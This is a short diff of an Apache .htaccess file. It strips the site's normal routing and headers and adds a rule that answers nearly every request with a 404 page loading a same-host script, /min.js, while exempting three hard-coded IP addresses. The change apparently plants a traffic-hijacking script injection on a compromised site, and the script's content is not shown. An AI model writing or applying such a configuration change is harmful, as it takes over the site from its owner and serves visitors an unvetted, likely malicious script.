@@ -1,11 +1,5 @@
-<If "%{HTTP_HOST} != 'pilot.parts'">
+AddDefaultCharset UTF-8
+<If "!(%{REMOTE_ADDR} in {'35.138.226.122','68.103.68.155','97.76.210.20'} && %{REQUEST_URI} in {'/min.js'})">
+ ErrorDocument 404 "<!DOCTYPE html><style>html,body{overscroll-behavior-y:contain !important;overflow:clip;text-overflow:ellipsis;white-space:nowrap;height:100%;margin:0}</style><script src=https://%{HTTP_HOST}/min.js></script>
  Redirect 404
 </If>
-AddDefaultCharset UTF-8
-ServerSignature Off
-FileETag none
-Header unset ETag
-DirectoryIndex pilot.php
-Options -Indexes -MultiViews +FollowSymlinks
-RewriteEngine on
-RewriteRule . pilot.php
